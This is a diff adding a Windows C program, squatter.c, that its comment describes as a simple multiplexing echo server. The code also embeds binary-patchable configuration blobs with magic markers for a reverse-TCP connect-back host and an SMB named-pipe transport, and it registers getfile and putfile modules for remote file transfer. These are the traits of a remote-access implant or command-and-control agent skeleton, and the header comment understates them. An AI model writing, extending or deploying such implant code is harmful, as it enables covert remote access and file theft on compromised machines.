@@ -1,0 +1,341 @@
+/* squatter.c -- the squatter server.
+ *
+ * Binds a TCP port and, for each connection, runs an sq_session that
+ * multiplexes many streams over it. Each stream runs a module (here: "echo")
+ * on its own thread behind a message-mode pipe. Drive it with the squatterctl
+ * client (//client/cmd/squatterctl).
+ *
+ *     squatter.exe [port]        (default 9100)
+ *
+ * This is the smallest transport driver over the runtime: a blocking accept
+ * loop handing each socket to a session, which does the framing, mux/demux,
+ * streams, and module dispatch.
+ */
+#include "runtime/channel.h"
+#include "modules/echo.h"
+#include "modules/getfile.h"
+#include "runtime/module.h"
+#include "modules/putfile.h"
+#include "runtime/session.h"
+#include "base/win.h"
+#include "sqlog/sqlog.h"
+
+enum { SQ_MAX_SESSIONS = 256 };
+enum {
+    SQ_HOVEL_TRANSPORT_NONE = 0,
+    SQ_HOVEL_TRANSPORT_REVERSE_TCP = 1,
+    SQ_HOVEL_TRANSPORT_SMB_PIPE = 2,
+};
+
+typedef struct sq_hovel_build_info {
+    char magic[8];
+    DWORD version;
+    DWORD capabilities;
+    DWORD transports;
+} sq_hovel_build_info;
+
+typedef struct sq_hovel_config {
+    char magic[8];
+    DWORD kind;
+    BYTE reverse_tcp_host[4];
+    WORD reverse_tcp_port;
+    wchar_t pipe_name[128];
+} sq_hovel_config;
+
+__attribute__((used)) const sq_hovel_build_info squatter_build_info = {
+    {'S', 'Q', 'U', 'A', 'T', '0', '0', '1'},
+    0x00010000u,
+    0x0000001fu,
+    0x00000003u,
+};
+
+__attribute__((used)) const sq_hovel_config squatter_transport_config = {
+    {'S', 'Q', 'C', 'F', 'G', '0', '0', '1'},
+    SQ_HOVEL_TRANSPORT_NONE,
+    {127u, 0u, 0u, 1u},
+    9100u,
+    L"\\\\.\\pipe\\squatter",
+};
+
+static SOCKET g_listen = INVALID_SOCKET;
+static HANDLE g_pipe_listener = INVALID_HANDLE_VALUE;
+static volatile int g_stop = 0;
+
+static BOOL WINAPI on_ctrl(DWORD type)
+{
+    (void)type;
+    g_stop = 1;
+    if (g_listen != INVALID_SOCKET) {
+        SOCKET s = g_listen;
+        g_listen = INVALID_SOCKET;
+        (void)closesocket(s); /* unblock accept() */
+    }
+    if (g_pipe_listener != INVALID_HANDLE_VALUE) {
+        HANDLE h = g_pipe_listener;
+        g_pipe_listener = INVALID_HANDLE_VALUE;
+        (void)CloseHandle(h); /* unblock ConnectNamedPipe() */
+    }
+    return TRUE;
+}
+
+static SOCKET listen_on(const wchar_t *port)
+{
+    ADDRINFOW hints;
+    ADDRINFOW *res = NULL;
+    SOCKET s = INVALID_SOCKET;
+    DWORD yes = 1;
+
+    ZeroMemory(&hints, sizeof hints);
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_flags = AI_PASSIVE;
+
+    if (GetAddrInfoW(NULL, port, &hints, &res) != 0) {
+        return INVALID_SOCKET;
+    }
+    s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+    if (s != INVALID_SOCKET) {
+        (void)setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char *)&yes,
+                         (int)sizeof yes);
+        if (bind(s, res->ai_addr, (int)res->ai_addrlen) != 0 ||
+            listen(s, SOMAXCONN) != 0) {
+            (void)closesocket(s);
+            s = INVALID_SOCKET;
+        }
+    }
+    FreeAddrInfoW(res);
+    return s;
+}
+
+static HANDLE create_pipe_instance(const wchar_t *pipe_name)
+{
+    return CreateNamedPipeW(
+        pipe_name,
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+        PIPE_UNLIMITED_INSTANCES,
+        65536,
+        65536,
+        0,
+        NULL);
+}
+
+static SOCKET connect_reverse_tcp(const sq_hovel_config *config)
+{
+    struct sockaddr_in addr;
+    SOCKET s = INVALID_SOCKET;
+
+    ZeroMemory(&addr, sizeof addr);
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(config->reverse_tcp_port);
+    CopyMemory(&addr.sin_addr, config->reverse_tcp_host,
+               sizeof config->reverse_tcp_host);
+
+    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (s == INVALID_SOCKET) {
+        return INVALID_SOCKET;
+    }
+    if (connect(s, (const struct sockaddr *)&addr, (int)sizeof addr) != 0) {
+        (void)closesocket(s);
+        return INVALID_SOCKET;
+    }
+    return s;
+}
+
+static void run_single_session(SOCKET socket, const sq_module_table *table)
+{
+    sq_channel *ch = NULL;
+    sq_session *session = NULL;
+
+    ch = sq_channel_from_socket(socket);
+    if (ch == NULL) {
+        (void)closesocket(socket);
+        return;
+    }
+    session = sq_session_create(ch, table);
+    if (session == NULL) {
+        sq_channel_free(ch);
+        return;
+    }
+    while (!g_stop) {
+        Sleep(250);
+    }
+    sq_session_destroy(session);
+}
+
+static void run_named_pipe_server(const wchar_t *pipe_name,
+                                  const sq_module_table *table)
+{
+    sq_session *sessions[SQ_MAX_SESSIONS];
+    int session_count = 0;
+    int i = 0;
+
+    SQLOG_INFO(SQLOG_SUB_MUX,
+               L"listening on named pipe %s; connect over SMB as \\\\HOST\\pipe\\...",
+               pipe_name);
+
+    while (!g_stop) {
+        HANDLE pipe = create_pipe_instance(pipe_name);
+        BOOL connected = FALSE;
+        sq_channel *ch = NULL;
+        sq_session *s = NULL;
+
+        g_pipe_listener = pipe;
+        if (pipe == INVALID_HANDLE_VALUE) {
+            SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, GetLastError(),
+                         L"CreateNamedPipeW failed");
+            break;
+        }
+
+        connected = ConnectNamedPipe(pipe, NULL);
+        if (connected == FALSE) {
+            DWORD const err = GetLastError();
+            if (err == ERROR_PIPE_CONNECTED) {
+                connected = TRUE;
+            } else {
+                (void)CloseHandle(pipe);
+                if (g_stop || err == ERROR_OPERATION_ABORTED ||
+                    err == ERROR_INVALID_HANDLE) {
+                    break;
+                }
+                SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, err,
+                             L"ConnectNamedPipe failed");
+                continue;
+            }
+        }
+
+        g_pipe_listener = INVALID_HANDLE_VALUE;
+        if (connected == FALSE) {
+            (void)CloseHandle(pipe);
+            continue;
+        }
+
+        SQLOG_INFO(SQLOG_SUB_MUX, L"named-pipe connection accepted");
+        ch = sq_channel_from_handle(pipe);
+        if (ch == NULL) {
+            (void)CloseHandle(pipe);
+            continue;
+        }
+        s = sq_session_create(ch, table);
+        if (s == NULL) {
+            sq_channel_free(ch);
+            continue;
+        }
+        if (session_count < SQ_MAX_SESSIONS) {
+            sessions[session_count++] = s;
+        } else {
+            sq_session_destroy(s);
+        }
+    }
+
+    SQLOG_INFO(SQLOG_SUB_MUX, L"shutting down (%d pipe session(s))", session_count);
+    for (i = 0; i < session_count; i++) {
+        sq_session_destroy(sessions[i]);
+    }
+}
+
+static const wchar_t *configured_port(const sq_hovel_config *config,
+                                      wchar_t port_buffer[16])
+{
+    if (config->kind == SQ_HOVEL_TRANSPORT_REVERSE_TCP &&
+        config->reverse_tcp_port != 0) {
+        (void)wnsprintfW(port_buffer, 16, L"%u",
+                         (unsigned)config->reverse_tcp_port);
+        return port_buffer;
+    }
+    return L"9100";
+}
+
+int wmain(int argc, wchar_t **argv); /* -municode entry; declare to satisfy -Wmissing-prototypes */
+
+int wmain(int argc, wchar_t **argv)
+{
+    static const sq_module modules[] = {
+        {"echo", sq_echo_module_main},
+        {"getfile", sq_getfile_module_main},
+        {"putfile", sq_putfile_module_main},
+    };
+    static const sq_module_table table = {
+        modules, (int)(sizeof modules / sizeof modules[0])};
+    wchar_t configured_port_buffer[16];
+    sq_session *sessions[SQ_MAX_SESSIONS];
+    int session_count = 0;
+    const wchar_t *port = (argc > 1) ? argv[1] :
+        configured_port(&squatter_transport_config, configured_port_buffer);
+    WSADATA wsa;
+    int i = 0;
+
+    sqlog_init();
+    sqlog_set_level(SQLOG_LEVEL_INFO);
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        SQLOG_ERROR(SQLOG_SUB_MUX, L"WSAStartup failed");
+        return 1;
+    }
+    (void)SetConsoleCtrlHandler(on_ctrl, TRUE);
+    if (squatter_transport_config.kind == SQ_HOVEL_TRANSPORT_REVERSE_TCP) {
+        SOCKET peer = connect_reverse_tcp(&squatter_transport_config);
+        if (peer == INVALID_SOCKET) {
+            SQLOG_ERROR(SQLOG_SUB_MUX, L"failed to connect reverse TCP session");
+            (void)WSACleanup();
+            return 1;
+        }
+        SQLOG_INFO(SQLOG_SUB_MUX, L"reverse TCP session connected");
+        run_single_session(peer, &table);
+        (void)WSACleanup();
+        sqlog_shutdown();
+        return 0;
+    }
+    if (squatter_transport_config.kind == SQ_HOVEL_TRANSPORT_SMB_PIPE) {
+        run_named_pipe_server(squatter_transport_config.pipe_name, &table);
+        (void)WSACleanup();
+        sqlog_shutdown();
+        return 0;
+    }
+    g_listen = listen_on(port);
+    if (g_listen == INVALID_SOCKET) {
+        SQLOG_ERROR(SQLOG_SUB_MUX, L"failed to listen on port %s (in use?)", port);
+        (void)WSACleanup();
+        return 1;
+    }
+    SQLOG_INFO(SQLOG_SUB_MUX,
+               L"listening on port %s (module: echo); Ctrl-C to stop", port);
+
+    for (;;) {
+        SOCKET client = accept(g_listen, NULL, NULL);
+        sq_channel *ch = NULL;
+        sq_session *s = NULL;
+
+        if (client == INVALID_SOCKET) {
+            if (g_stop) {
+                break;
+            }
+            continue;
+        }
+        SQLOG_INFO(SQLOG_SUB_MUX, L"connection accepted");
+        ch = sq_channel_from_socket(client);
+        if (ch == NULL) {
+            (void)closesocket(client);
+            continue;
+        }
+        s = sq_session_create(ch, &table);
+        if (s == NULL) {
+            sq_channel_free(ch);
+            continue;
+        }
+        if (session_count < SQ_MAX_SESSIONS) {
+            sessions[session_count++] = s;
+        } else {
+            sq_session_destroy(s); /* at capacity: do not retain */
+        }
+    }
+
+    SQLOG_INFO(SQLOG_SUB_MUX, L"shutting down (%d session(s))", session_count);
+    for (i = 0; i < session_count; i++) {
+        sq_session_destroy(sessions[i]);
+    }
+    (void)WSACleanup();
+    sqlog_shutdown();
+    return 0;
+}
